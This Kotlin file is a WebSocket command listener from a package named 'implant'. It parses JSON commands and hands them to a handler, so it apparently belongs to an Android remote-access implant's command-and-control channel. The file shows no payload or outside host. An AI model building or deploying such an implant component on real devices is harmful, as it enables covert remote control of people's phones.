package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.model.Command
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class CommandListener(private val context: Context) : WebSocketListener() {

    companion object {
        val TAG = CommandListener::class.java.name
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        Log.d(CommandService.TAG, "Listening for commands.")
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        val command: Command = try {
            Command.fromJson(text)
        } catch (e: Exception) {
            Log.e(CommandService.TAG, "Error parsing JSON from: $text.", e)
            e.printStackTrace()
            return
        }
        Log.d(CommandService.TAG, "Command received: $text")
        val handler = CommandHandler(context, command, webSocket)
        handler.handle()
    }
}